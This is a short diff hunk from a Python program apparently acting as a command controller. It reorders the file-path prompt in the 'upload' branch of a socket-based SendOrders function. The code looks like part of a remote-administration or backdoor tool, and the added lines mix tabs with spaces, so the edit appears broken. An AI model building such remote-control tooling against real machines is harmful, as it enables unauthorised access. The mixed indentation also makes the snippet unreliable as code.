@@ -96,14 +96,14 @@ def SendOrders(Con):
         elif(Command == 'upload'): 
 
             try:
-
-                Up = input(" - File Path -> ")
-
+		
                 Con.send(str.encode(Command)) # Send Command
 
                 Recv = Con.recv(1024)
 
                 Recv = Recv.decode("utf-8")
+		
+		Up = input(" - File Path -> ")
 
                 if(Recv == "file"):
 
